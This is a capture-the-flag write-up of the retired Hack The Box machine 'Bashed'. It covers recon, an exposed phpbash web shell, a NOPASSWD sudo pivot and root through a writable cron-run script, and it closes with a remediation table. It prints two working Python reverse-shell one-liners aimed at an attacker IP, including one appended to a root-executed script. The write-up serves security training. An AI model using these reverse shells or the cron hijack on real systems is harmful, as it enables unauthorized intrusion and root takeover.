# Bashed — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🐧 Linux (Ubuntu 16.04) |
| **Difficulty** | 🟢 Easy |
| **Owned** | 30/09/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`HTB{__REDACTED__}`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Bashed** is a web box whose whole chain comes from leftover developer artefacts and lazy
automation. The developer left **phpbash** — a self-contained, semi-interactive PHP web shell — in
a `/dev/` directory, handing out `www-data` RCE straight from the browser. From there a
`NOPASSWD` sudo rule pivots to the `scriptmanager` user, who owns a `/scripts` directory that
**root runs every minute via cron** — dropping a payload into a `.py` file there gives a root shell.

**Attack path:** `exposed phpbash web shell (/dev/phpbash.php) → www-data → sudo -u scriptmanager (NOPASSWD) → writable root cron in /scripts → root`

---

## 🔍 1. Reconnaissance

### Port scan

Full TCP sweep — only one port is open:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

A UDP top-100 scan (`nmap -sU --top-ports 100`) returned nothing actionable, so the entire box
hangs off HTTP.

| Port | Service | Version | Notes |
|-----:|---------|---------|-------|
| 80   | http    | Apache 2.4.18 (Ubuntu) | "Arrexel's Development Site" |

---

## 🧭 2. Enumeration

`whatweb` confirms a stock Apache on Ubuntu and a Colorlib ("Suppablog") HTML template:

```bash
$ whatweb http://10.129.76.99
http://10.129.76.99 [200 OK] Apache[2.4.18], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)],
JQuery, Meta-Author[Colorlib], Title[Arrexel's Development Site]
```

The **content is the real lead.** One of the blog posts talks about a tool the author wrote:

> [phpbash](https://github.com/Arrexel/phpbash) helps a lot with pentesting … I actually developed
> it on **this exact server**!

phpbash is a standalone, semi-interactive web shell. If a copy is still on disk, it *is* the
foothold — no exploit required. Directory brute-forcing finds where it lives:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ \
     -u http://10.129.76.99/FUZZ -ac -c -t 50 -recursion -recursion-depth 2 \
     -mc 200,204,301,302,307,401,403
# → /dev/  (directory)
```

Browsing `http://10.129.76.99/dev/` lists `phpbash.php`.

---

## 🎯 3. Foothold

`http://10.129.76.99/dev/phpbash.php` renders an interactive terminal in the browser, already
running as **www-data** — a full, unauthenticated RCE with zero exploitation:

```
www-data@bashed:/var/www/html/dev$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The **user flag** is readable from here — `/home/arrexel/user.txt`.

Upgrade the clunky browser shell to a real reverse shell (listener first, then trigger the
one-liner from phpbash):

```bash
# attacker
rlwrap nc -lvnp 1337
```

```bash
# in phpbash (www-data)
export RHOST="10.10.15.121"; export RPORT=1337
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

---

## ⬆️ 4. Privilege Escalation

### www-data → scriptmanager (NOPASSWD sudo)

`sudo -l` shows www-data can become **scriptmanager** with no password:

```
www-data@bashed:/var/www/html/dev$ sudo -l
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

```bash
sudo -u scriptmanager -i
```

### scriptmanager → root (writable script run by root cron)

The reason scriptmanager matters becomes clear with **pspy** (no auth needed to watch process
creation): root runs every `.py` file in `/scripts` once a minute.

```
$ ./pspy64
CMD: UID=0  PID=…  | /usr/sbin/CRON -f
CMD: UID=0  PID=…  | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
CMD: UID=0  PID=…  | python test.py
```

`/scripts` is owned by scriptmanager, so scriptmanager can edit the very files root executes.
Append a reverse shell to one of them and wait for the next cron tick:

```bash
# as scriptmanager — start a second listener first, then:
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.15.121",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' >> /scripts/test.py
```

Within a minute the cron job runs `test.py` as root and the listener catches a root shell:

```
root@bashed:~# id
uid=0(root) gid=0(root) groups=0(root)
```

`root.txt` is in `/root`.

---

## 🚩 Proof

```
user.txt: HTB{__REDACTED__}
root.txt: HTB{__REDACTED__}
```

---

## 🧠 Lessons Learned

- **What worked:** Reading the site's own content beat any scanner — the blog post named phpbash
  and even said it was developed *on this server*, which turned directory brute-forcing into a
  targeted search rather than a fishing trip. The privesc was pure enumeration discipline:
  `sudo -l` → pspy → notice who owns the directory root executes.
- **Rabbit holes:** `searchsploit` surfaced a *Webfroot Shoutbox* LFI/RCE and recent Apache CVEs
  (CVE-2024-40725 / CVE-2024-40898). Neither applies to this box — Apache 2.4.18 predates them and
  the shoutbox isn't present. Chasing version-string CVEs before finishing content enumeration cost
  time; the intended path needed no exploit at all.
- **OSCP takeaway:** An exposed developer/debug artefact (web shell, admin panel, backup) is a
  first-class foothold — look for one before reaching for exploits. For privesc, a writable file
  executed by a higher-privileged scheduled task is one of the most common Linux root paths; `pspy`
  reveals it without needing to read the crontab.

---

## 🛡️ Remediation

| Finding | Severity | Fix |
|---------|:--------:|-----|
| phpbash web shell left in web root (`/dev/phpbash.php`) | Critical | Never deploy debug/web-shell tooling to a reachable host; remove `/dev` and audit the web root for stray scripts. |
| `www-data` → `scriptmanager` via `NOPASSWD: ALL` | High | Remove the sudo rule; a web-service account should not be able to pivot to another user passwordless. |
| Root cron executes world-/group-writable scripts in `/scripts` | Critical | Root-run scripts and their directory must be root-owned and non-writable by lower-priv users; pin exact files instead of globbing `*.py`. |

---

## 🔗 References

- [phpbash — Arrexel (GitHub)](https://github.com/Arrexel/phpbash)
- [pspy — unprivileged process snooping](https://github.com/DominicBreuker/pspy)
- [GTFOBins — sudo](https://gtfobins.github.io/)
